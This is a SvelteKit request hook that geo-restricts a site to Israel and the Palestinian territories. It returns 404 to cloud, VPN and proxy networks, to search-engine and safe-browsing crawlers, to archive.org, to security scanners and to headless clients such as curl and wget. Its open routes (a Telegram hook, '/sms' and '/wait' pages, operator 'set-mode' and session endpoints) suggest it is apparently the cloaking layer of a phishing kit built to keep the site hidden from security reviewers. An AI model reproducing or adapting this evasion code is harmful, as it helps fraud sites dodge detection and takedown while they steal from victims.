/**
 * Hardened bot / crawler / scanner / cloud blocker.
 *
 * Layers of defense (each short-circuits to a 404):
 *   0. Allow-list admin + API + static assets
 *   1. Geo: only IL + PS
 *   2. Cloudflare signals: block known hosting / bot ASNs, Tor, known orgs
 *   3. User-Agent patterns + structural checks
 *   4. Missing / fake browser headers
 *   5. Datacenter / VPN IP fallback via ipapi.co
 */

import { inc } from '$lib/stats.js';
import { isAdminAuthed } from '$lib/auth.js';

// ---------- UA patterns ----------
const BOT_UA = /(googlebot|adsbot-google|mediapartners-google|google-inspectiontool|google-site-verification|google-read-aloud|googleother|googleweblight|apis-google|feedfetcher-google|google favicon|chrome-lighthouse|google page speed|googleimageproxy|bot|crawl|spider|scan|slurp|fetch|curl|wget|python-requests|python\/|go-http|okhttp|httpclient|java\/|axios|node-fetch|got\/|undici|lighthouse|headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver|pagespeed|gtmetrix|pingdom|uptimerobot|monitoring|statuscake|newrelic|datadog|site24x7|seobility|semrush|ahrefs|majestic|mj12|dotbot|petalbot|yandex|bingpreview|applebot|facebot|facebookexternalhit|whatsapp|telegrambot|discordbot|skypeuri|linkedinbot|twitterbot|slackbot|embedly|vkshare|w3c_validator|feedburner|rss|newsgator|postman|insomnia|apachebench|ab\/|siege|hey\/|vegeta|k6|locust|gatling|masscan|zgrab|nuclei|nikto|nmap|sqlmap|acunetix|nessus|openvas|burpsuite|zaproxy|wpscan|gobuster|dirbuster|ffuf|feroxbuster|shodan|censys|binaryedge|netcraft|archive\.org|wayback|httrack|heritrix|scrapy|colly|winhttp|libwww|lwp|mechanize|requests)/i;

// ---------- Hosting / cloud / VPN / datacenter org names ----------
const BAD_ORG = /(amazon|aws\b|google[- ]?cloud|\bgcp\b|microsoft|azure|digitalocean|linode|vultr|hetzner|\bovh\b|scaleway|oracle|alibaba|tencent|baidu|huawei|contabo|choopa|leaseweb|m247|cloudflare|fastly|akamai|rackspace|\bibm\b|softlayer|upcloud|datacamp|kamatera|cdn77|stackpath|bunny|cherryservers|ramnode|buyvm|pfcloud|worldstream|psychz|cogent|he\.net|quadranet|servermania|hivelocity|colocrossing|gcorelabs|g-core|cloudvps|vpsserver|ionos|hostwinds|cloudsigma|turnkey internet|noez|incapsula|imperva|sucuri|reg\.ru|selectel|timeweb|beget|rusonyx|yandex cloud|mail\.ru cloud|vk cloud|gremlin|latitude|maxihost|dmit|bluehost|siteground|namecheap|hostgator|dreamhost|a2 hosting|arvixe|inmotion|liquid web|webhost|exabytes|heficed|host europe|1&1|register\.it|serverloft|netcup|strato|one\.com|privateinternetaccess|\bpia\b|nordvpn|nord\svpn|expressvpn|protonvpn|surfshark|mullvad|cyberghost|ipvanish|hidemyass|windscribe|privadovpn|airvpn|purevpn|torguard|vyprvpn|zenmate|kape|hola|zacebookpk|\bvpn\b|\btor\b|tor[- ]?exit|tor[- ]?relay|\brelay\b|proxy|anonymous|hosting|colocation|\bserver\b|\bvps\b|dedicated|datacenter|data[- ]?center|cdn|\bbot\b|crawler|scraper|scraping|bright\s?data|luminati|oxylabs|smartproxy|iproyal|netnut|rayobyte|proxyrack|geosurf|froxy|infatica|webshare|shifter|packet\s?stream|soax|proxyempire|blazing\s?seollc|high\s?proxies|stormproxies|microleaves|squidproxies)/i;

// ---------- Known bad ASNs (hosting / VPN / scanners / proxies) ----------
const BAD_ASNS = new Set([
  // AWS
  16509, 14618, 8987, 39111, 7224, 10124,
  // Google / GCP / Googlebot
  15169, 36040, 396982, 19527, 22577, 41264, 139190, 394089, 394699, 36384, 36385, 36492, 43515, 32934, 139070, 395973,
  // Microsoft / Azure / Bing
  8075, 8068, 8069, 8070, 8071, 8072, 8073, 8074, 12076, 6182, 3598, 398961,
  // DigitalOcean
  14061, 200130, 202018, 393406, 46652,
  // Linode / Akamai / Akamai-Linode
  63949, 20940, 16625, 21342, 21357, 23454, 23455, 33905, 12222, 34164, 35993, 35994,
  // Vultr / Choopa / The Constant Company
  20473, 64515, 14061,
  // OVH / OVHCloud
  16276, 35540,
  // Hetzner
  24940, 213230,
  // Scaleway / Online.net / iliad
  12876, 59043, 200325,
  // Oracle Cloud
  31898, 7160, 14413,
  // Alibaba Cloud
  45102, 37963, 134963, 45104, 134937, 59028, 24429,
  // Tencent Cloud
  132203, 45090, 133478, 132591,
  // Baidu Cloud
  55967, 38365, 4808, 4837,
  // Huawei Cloud
  136907, 55990, 135061, 55960,
  // Yandex / Selectel / VK / Mail.ru / Timeweb / Beget (Russian clouds)
  13238, 49505, 47764, 47542, 9123, 197695, 197326, 48666, 207725, 57724,
  // M247 / Leaseweb / wholesale hosting
  9009, 60781, 16265, 30633, 7203, 43350, 29302, 28753, 50673,
  // Cloudflare / Fastly / edge
  13335, 54113, 209242, 395747,
  // Cogent / HE / backbone but hosting-heavy
  174, 6939,
  // IBM / SoftLayer
  36351, 26496, 21501,
  // Contabo / Hostinger / GoDaddy / IONOS / Namecheap / Netcup
  51167, 56655, 47583, 8560, 8972, 34549, 61317, 22612, 197540, 399610,
  // G-Core Labs / Path.net / Datacamp / CDN77
  199524, 202422, 396356, 212238, 60068,  // 60068 = Datacamp / CDN77
  // PIA / London Trust
  133380, 209854,
  // NordVPN / Tefincom / NordLayer
  136787, 200019, 209299, 9009,
  // ProtonVPN / Proton AG
  62371, 62240, 51184,
  // ExpressVPN / Express VPN International
  56971, 206092,
  // Mullvad / DataPacket / 31173
  39351, 44669, 212238, 31173,
  // Surfshark / Surfshark Ltd / Net Solutions
  212238, 202032, 204915,
  // CyberGhost / IPVanish / HMA / TorGuard / Windscribe / Private Internet
  9009, 205119, 210477, 211720, 197207, 212238, 202053, 210630,
  // Hola Networks / Luminati / Bright Data (residential proxy)
  28917, 212238, 29119, 61317, 48314, 198605,
  // Oxylabs / Teso LT
  212238, 205297, 57286,
  // Smartproxy / IPRoyal / NetNut / Rayobyte / SOAX / Webshare
  212238, 204028, 207990, 396356, 399629, 62904, 62874, 21859, 63023,
  // Shodan / Censys / BinaryEdge / Rapid7 scanners
  395343, 398722, 200373, 398024, 46844, 198605,
  // Quadranet / ColoCrossing / HostRoyale / Path.net / QuadraNet
  8100, 36352, 203020, 208091, 396356,
  // Hivelocity / ServerMania / Psychz / ReliableSite / WorldStream
  29761, 29802, 40676, 23470, 49981,
  // Rackspace / Rackspace US
  19994, 33070, 15395, 10532, 27357,
  // Hostwinds / UpCloud / Kamatera / VPSServer / CloudSigma
  54290, 202053, 51852, 212238, 50837,
  // Latitude.sh / Maxihost / DMIT / BlueVPS / Turnkey / Heficed
  268703, 262287, 215540, 213074, 44925,
  // Generic hosting / bulletproof / LIR-resellers used by scanners
  62355, 50340, 43317, 9002, 57629, 42831, 197226, 60117, 61282, 210079, 60781,
  39572, 207812, 209605, 211720, 202425, 204420, 205065, 206092, 207990,
  211252, 211703, 212047, 213373, 214393, 216246, 48024, 48666, 50297,
  57629, 58061, 59711, 60404, 60567, 60781, 60969, 61098, 61317
]);

// ---------- Allowed mobile-carrier / consumer ISP ASN hints (Israel + PS) ----------
// If a request claims a mobile UA, it must come from one of these.
const IL_CONSUMER_ASNS = new Set([
  // Bezeq & family
  8551, 1403, 8691,
  // NetVision / 013 / Cellcom fixed
  1680, 1680,
  // HOT / HOT Mobile / HOT-Net
  12849, 378, 24835,
  // 012 Smile / GoldenLines / 012 Mobile
  9116, 8867,
  // Partner (Orange IL)
  12400, 25010,
  // Cellcom Mobile / Cellcom DC
  42013, 8691,
  // Pelephone
  15975,
  // Xfone / Marathon
  20927,
  // 018 Xphone / Smile Telecom
  12400, 42742,
  // Triple C / Internet Gold
  20255, 1680,
  // WeBezeq / Bezeq business
  8551, 13110,
  // Palestine Telecom (Paltel) / Jawwal / Mada / Ooredoo PS
  12975, 15975, 28972, 30958, 34919, 56921, 12975
]);

// ---------- Always-allow paths ----------

// ---------- Always-allow paths ----------
const ALLOW_PATHS = [
  /^\/admin(\/|$)/,
  /^\/login(\/|$)/,
  /^\/api\/(tg-hook|set-mode|check-mode|sessions|visit|post|submit|delete-session|admin-login|presence)(\/|$)?/,
  /^\/wait(\.html)?(\/|$)/,
  /^\/sms(\.html)?(\/|$)/,
  /^\/img\//,
  /^\/css\//,
  /^\/js\//,
  /^\/favicon/
];

// Admin-protected paths (need valid admin_token cookie)
const ADMIN_PATHS = [
  /^\/admin(\/|$)/,
  /^\/api\/(sessions|set-mode|delete-session)(\/|$)?/
];

// ---------- ipapi.co fallback cache ----------
const ipCache = new Map();
const IP_TTL = 60 * 60 * 1000;

async function isBadIP(ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) return false;
  const cached = ipCache.get(ip);
  if (cached && cached.exp > Date.now()) return cached.bad;
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) });
    if (!r.ok) return false;
    const j = await r.json();
    const org = `${j.org || ''} ${j.asn || ''} ${j.network || ''}`;
    const bad = BAD_ORG.test(org);
    ipCache.set(ip, { bad, exp: Date.now() + IP_TTL });
    return bad;
  } catch {
    return false;
  }
}

function blockResponse() {
  return new Response('', {
    status: 404,
    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
  });
}

function block(platform) {
  inc(platform, 'botsBlocked').catch(() => {});
  return blockResponse();
}

/** @type {import('@sveltejs/kit').Handle} */
export async function handle({ event, resolve }) {
  const { request, url, getClientAddress, platform, cookies } = event;
  const path = url.pathname;

  // Admin guard runs FIRST (before bot blocker) so legitimate admin always reaches login
  if (ADMIN_PATHS.some((re) => re.test(path))) {
    const token = cookies.get('admin_token');
    const authed = await isAdminAuthed(platform, token);
    if (!authed) {
      // For HTML page requests, redirect to login. For API, return 401.
      const accept = request.headers.get('accept') || '';
      if (accept.includes('text/html')) {
        return new Response('', { status: 302, headers: { Location: '/login' } });
      }
      return new Response('unauthorized', { status: 401 });
    }
    return resolve(event);
  }

  // 0. Always-allowed paths (login page, public APIs, static assets)
  if (ALLOW_PATHS.some((re) => re.test(path))) return resolve(event);

  const cf = platform?.cf || {};
  const h = request.headers;
  const method = request.method;

  // Only GET/POST are allowed for visitors
  if (method !== 'GET' && method !== 'POST' && method !== 'HEAD') return block(platform);

  // 1. Geo — only IL + PS (missing country = suspicious = block)
  const country = h.get('cf-ipcountry') || cf.country || '';
  if (!country) return block(platform);
  if (country !== 'IL' && country !== 'PS') return block(platform);
  // Cloudflare tags Tor exits as T1
  if (country === 'T1' || country === 'XX') return block(platform);

  // 2. Cloudflare ASN / org check (fast — no external lookup)
  const asn = Number(cf.asn || 0);
  if (!asn) return block(platform);                        // missing = non-CF or spoofed → block
  if (BAD_ASNS.has(asn)) return block(platform);
  const asOrg = String(cf.asOrganization || '');
  if (asOrg && BAD_ORG.test(asOrg)) return block(platform);

  // 2b. Cloudflare threat score (basic IP reputation, 0 = clean, 100 = worst)
  const threat = Number(cf.threatScore || 0);
  if (threat >= 10) return block(platform);

  // 3. User-Agent checks
  const ua = h.get('user-agent') || '';
  if (!ua.trim()) return block(platform);
  if (BOT_UA.test(ua)) return block(platform);
  if (ua.length < 40) return block(platform);              // too short = not real browser
  if (!/Mozilla\/5\.0/i.test(ua)) return block(platform);  // all real browsers use this
  // Must claim to be a real browser engine
  if (!/(Chrome|Firefox|Safari|Edg|OPR|Opera|SamsungBrowser|UCBrowser)\//i.test(ua)) return block(platform);

  // 3b. Mobile-UA sanity: if UA claims iPhone/iPad/Android but the ASN is NOT a known
  //     Israeli consumer/mobile carrier, treat as spoofed (bots love pretending to be mobile).
  const claimsMobile = /(iPhone|iPad|iPod|Android|Mobile Safari|SamsungBrowser)/i.test(ua);
  if (claimsMobile && !IL_CONSUMER_ASNS.has(asn)) return block(platform);

  // 4. Real-browser headers
  if (!h.get('accept-language')) return block(platform);
  const accept = h.get('accept') || '';
  if (!accept) return block(platform);

  // 4b. For top-level HTML page loads, require Sec-Fetch-* (all modern browsers send these;
  //     headless Node/curl/Python clients almost never do).
  const isHtml = accept.includes('text/html');
  if (isHtml && method === 'GET') {
    const secFetchMode = h.get('sec-fetch-mode') || '';
    const secFetchDest = h.get('sec-fetch-dest') || '';
    // Real browsers request top-level docs with mode=navigate, dest=document
    if (!secFetchMode || !secFetchDest) return block(platform);
    if (secFetchDest !== 'document' && secFetchDest !== 'empty') return block(platform);
  }

  // 5. ipapi.co fallback for top-level HTML page loads
  if (isHtml) {
    const ip = getClientAddress();
    if (await isBadIP(ip)) return block(platform);
  }

  return resolve(event);
}
